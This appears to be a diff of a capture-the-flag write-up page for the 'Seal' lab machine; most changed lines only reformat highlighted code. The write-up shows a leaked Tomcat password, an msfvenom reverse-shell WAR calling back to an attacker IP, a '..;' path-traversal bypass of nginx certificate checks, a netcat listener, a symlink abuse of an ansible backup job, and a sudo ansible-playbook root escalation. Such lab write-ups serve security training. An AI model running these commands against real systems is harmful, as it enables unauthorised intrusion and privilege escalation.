@@ -274,61 +274,61 @@ Disable manager and host-manager.
   [..]
 </code></pre>
 <p>Looking at nginx configuration <strong>sites-enabled/default</strong>, we can see the access to manager and dashboard interface is protected by certificate authentication:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>ssl_client_certificate <span style="color:#ff79c6">/</span><span style="color:#ff79c6">var</span><span style="color:#ff79c6">/</span>www<span style="color:#ff79c6">/</span>keys<span style="color:#ff79c6">/</span>selfsigned<span style="color:#ff79c6">-</span>ca<span style="color:#ff79c6">.</span>crt;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>server {
-</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">..</span>]
-</span></span><span style="display:flex;"><span>    location <span style="color:#ff79c6">/</span>manager<span style="color:#ff79c6">/</span>html {
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$ssl_client_verify</span> <span style="color:#ff79c6">!=</span> SUCCESS) { <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">403</span>; }
-</span></span><span style="display:flex;"><span>        [<span style="color:#ff79c6">..</span>]
-</span></span><span style="display:flex;"><span>        proxy_redirect      http<span style="color:#ff79c6">://</span>localhost<span style="color:#ff79c6">:</span><span style="color:#bd93f9">8000</span> https<span style="color:#ff79c6">://</span><span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    location <span style="color:#ff79c6">/</span>admin<span style="color:#ff79c6">/</span>dashboard {
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$ssl_client_verify</span> <span style="color:#ff79c6">!=</span> SUCCESS) { <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">403</span>; }
-</span></span><span style="display:flex;"><span>        [<span style="color:#ff79c6">..</span>]
-</span></span><span style="display:flex;"><span>        proxy_redirect      http<span style="color:#ff79c6">://</span>localhost<span style="color:#ff79c6">:</span><span style="color:#bd93f9">8000</span> https<span style="color:#ff79c6">://</span><span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    location <span style="color:#ff79c6">/</span>host<span style="color:#ff79c6">-</span>manager<span style="color:#ff79c6">/</span>html {
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$ssl_client_verify</span> <span style="color:#ff79c6">!=</span> SUCCESS) { <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">403</span>; }
-</span></span><span style="display:flex;"><span>        [<span style="color:#ff79c6">..</span>]
-</span></span><span style="display:flex;"><span>        proxy_redirect      http<span style="color:#ff79c6">://</span>localhost<span style="color:#ff79c6">:</span><span style="color:#bd93f9">8000</span> https<span style="color:#ff79c6">://</span><span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">ssl_client_certificate <span style="color:#ff79c6">/</span><span style="color:#ff79c6">var</span><span style="color:#ff79c6">/</span>www<span style="color:#ff79c6">/</span>keys<span style="color:#ff79c6">/</span>selfsigned<span style="color:#ff79c6">-</span>ca<span style="color:#ff79c6">.</span>crt;
+
+server {
+[<span style="color:#ff79c6">..</span>]
+    location <span style="color:#ff79c6">/</span>manager<span style="color:#ff79c6">/</span>html {
+        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$ssl_client_verify</span> <span style="color:#ff79c6">!=</span> SUCCESS) { <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">403</span>; }
+        [<span style="color:#ff79c6">..</span>]
+        proxy_redirect      http<span style="color:#ff79c6">://</span>localhost<span style="color:#ff79c6">:</span><span style="color:#bd93f9">8000</span> https<span style="color:#ff79c6">://</span><span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>;
+    }
+    location <span style="color:#ff79c6">/</span>admin<span style="color:#ff79c6">/</span>dashboard {
+        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$ssl_client_verify</span> <span style="color:#ff79c6">!=</span> SUCCESS) { <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">403</span>; }
+        [<span style="color:#ff79c6">..</span>]
+        proxy_redirect      http<span style="color:#ff79c6">://</span>localhost<span style="color:#ff79c6">:</span><span style="color:#bd93f9">8000</span> https<span style="color:#ff79c6">://</span><span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>;
+    }
+    location <span style="color:#ff79c6">/</span>host<span style="color:#ff79c6">-</span>manager<span style="color:#ff79c6">/</span>html {
+        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$ssl_client_verify</span> <span style="color:#ff79c6">!=</span> SUCCESS) { <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">403</span>; }
+        [<span style="color:#ff79c6">..</span>]
+        proxy_redirect      http<span style="color:#ff79c6">://</span>localhost<span style="color:#ff79c6">:</span><span style="color:#bd93f9">8000</span> https<span style="color:#ff79c6">://</span><span style="color:#bd93f9">0.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.0</span>;
+    }
+}
+</code></pre></td></tr></table>
 </div>
 </div><p>I found this resource to explain me how client-certificate authentication works with nginx: <a href="https://jason.whitehorn.us/blog/2019/02/01/client-certificate-auth-with-nginx/">https://jason.whitehorn.us/blog/2019/02/01/client-certificate-auth-with-nginx/</a> .</p>
 <p>On tomcat/tomcat-users.xml we find the manager password removed by an older commit 971f3aa3f0a0cc8aac12fd696d9631ca540f44c7:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;user</span> <span style="color:#50fa7b">username=</span><span style="color:#f1fa8c">&#34;tomcat&#34;</span> <span style="color:#50fa7b">password=</span><span style="color:#f1fa8c">&#34;42MrHBf*z8{Z%&#34;</span> <span style="color:#50fa7b">roles=</span><span style="color:#f1fa8c">&#34;manager-gui,admin-gui&#34;</span><span style="color:#ff79c6">/&gt;</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;user</span> <span style="color:#50fa7b">username=</span><span style="color:#f1fa8c">&#34;tomcat&#34;</span> <span style="color:#50fa7b">password=</span><span style="color:#f1fa8c">&#34;42MrHBf*z8{Z%&#34;</span> <span style="color:#50fa7b">roles=</span><span style="color:#f1fa8c">&#34;manager-gui,admin-gui&#34;</span><span style="color:#ff79c6">/&gt;</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>Tomcat dashboard <strong>/manager/status</strong> does not appear to be protected with client-certificate authentication. Supplying above credentials is a Success. And we get a lot of useful information:</p>
 <table>
@@ -368,21 +368,21 @@ msfvenom -p java/shell_reverse_tcp  --list-options
 msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.44 LPORT=443 -f war -o /data/evil.war
 </code></pre>
 <p>I have to edit the form action field:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">form</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/manager/status/..;/html/upload?org.apache.catalina.filters.CSRF_NONCE=D1D43C74CF17A2E24CDC4E7099F68642&#34;</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">enctype</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;multipart/form-data&#34;</span>
-</span></span><span style="display:flex;"><span>&gt;&lt;/<span style="color:#ff79c6">form</span>&gt;
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#ff79c6">form</span>
+  <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span>
+  <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/manager/status/..;/html/upload?org.apache.catalina.filters.CSRF_NONCE=D1D43C74CF17A2E24CDC4E7099F68642&#34;</span>
+  <span style="color:#50fa7b">enctype</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;multipart/form-data&#34;</span>
+&gt;&lt;/<span style="color:#ff79c6">form</span>&gt;
+</code></pre></td></tr></table>
 </div>
 </div><p>We start a netcat listener and we deploy the war in tomcat. Upon visit of <a href="https://seal.htb/evil/">https://seal.htb/evil/</a> we have reverse shell:</p>
 <pre><code>nc -lnvp 443
@@ -455,39 +455,39 @@ luis        1122  0.7 10.0 3654680 406952 ?      Sl   07:11   2:16  |       \_ j
 root       56850  0.0  0.0   2608   604 ?        Ss   12:16   0:00      \_ /bin/sh -c sleep 30 &amp;&amp; sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
 </code></pre>
 <p>We can download the run.yml playbook, and we can see that it will copy everything from the tomcat dashboard directory, including symlinks (see row 6: <code>copy_links=yes</code>):</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span>tomcat@seal:/var/lib/tomcat9/conf$ cat /opt/backups/playbook/run.yml
-</span></span><span style="display:flex;"><span>cat /opt/backups/playbook/run.yml
-</span></span><span style="display:flex;"><span>- <span style="color:#ff79c6">hosts</span>: localhost
-</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">tasks</span>:
-</span></span><span style="display:flex;"><span>  - <span style="color:#ff79c6">name</span>: Copy Files
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">synchronize</span>: src=https://0xade1.github.io/devdraft/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
-</span></span><span style="display:flex;"><span>  - <span style="color:#ff79c6">name</span>: Server Backups
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">archive</span>:
-</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">path</span>: /opt/backups/files/
-</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">dest</span>: <span style="color:#f1fa8c">&#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz&#34;</span>
-</span></span><span style="display:flex;"><span>  - <span style="color:#ff79c6">name</span>: Clean
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">file</span>:
-</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">state</span>: absent
-</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">path</span>: /opt/backups/files/
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml">tomcat@seal:/var/lib/tomcat9/conf$ cat /opt/backups/playbook/run.yml
+cat /opt/backups/playbook/run.yml
+- <span style="color:#ff79c6">hosts</span>: localhost
+  <span style="color:#ff79c6">tasks</span>:
+  - <span style="color:#ff79c6">name</span>: Copy Files
+    <span style="color:#ff79c6">synchronize</span>: src=https://0xade1.github.io/devdraft/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
+  - <span style="color:#ff79c6">name</span>: Server Backups
+    <span style="color:#ff79c6">archive</span>:
+      <span style="color:#ff79c6">path</span>: /opt/backups/files/
+      <span style="color:#ff79c6">dest</span>: <span style="color:#f1fa8c">&#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz&#34;</span>
+  - <span style="color:#ff79c6">name</span>: Clean
+    <span style="color:#ff79c6">file</span>:
+      <span style="color:#ff79c6">state</span>: absent
+      <span style="color:#ff79c6">path</span>: /opt/backups/files/
+</code></pre></td></tr></table>
 </div>
 </div><p>We can try to copy user.txt and .ssh folder by creating a symlink in a writable folder. uploads folder is a good candidate:</p>
 <pre><code>tomcat@seal:/var/lib/tomcat9$ cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard
@@ -592,7 +592,7 @@ User luis may run the following commands on seal:
 </code></pre>
 <p>GTFObins gives us an easy privilege escalation for <a href="https://gtfobins.github.io/gtfobins/ansible-playbook/">ansible-playbook</a>:</p>
 <pre tabindex="0"><code>TF=$(mktemp)
-echo &#39;[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]&#39; &gt;$TF
+echo '[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]' &gt;$TF
 sudo ansible-playbook $TF
 [..]
 # id
